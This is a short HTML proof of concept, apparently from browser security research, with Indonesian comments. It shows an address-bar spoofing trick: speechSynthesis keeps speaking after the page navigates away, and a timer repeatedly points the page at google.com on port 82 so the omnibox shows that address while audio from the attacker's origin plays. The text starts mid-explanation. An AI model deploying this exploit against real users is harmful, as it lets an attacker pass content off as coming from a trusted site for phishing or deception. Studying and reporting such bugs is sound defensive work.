     MEKANISME  ini gabungan, dan itu intinya. speechSynthesis dimiliki BROWSER, bukan dokumen -
     ia terus bicara setelah dokumen pemanggilnya ditinggalkan. Sementara itu omnibox ditahan

<button onclick="go()">Run 16 (ada suara)</button>
<p id=r></p>
<script>
document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
function go() {
  var u = new SpeechSynthesisUtterance('Ini rekaman uji riset keamanan. Suara ini berasal dari origin penyerang, bukan dari alamat yang tertulis di address bar.');
  u.rate = 0.9; speechSynthesis.speak(u);
  document.write('<h2>Dengarkan suaranya, lalu baca omnibox.</h2>');
  location = 'https://www.google.com:82';
  setInterval(function () { location = 'https://www.google.com:82'; }, 9800);
}
</script>
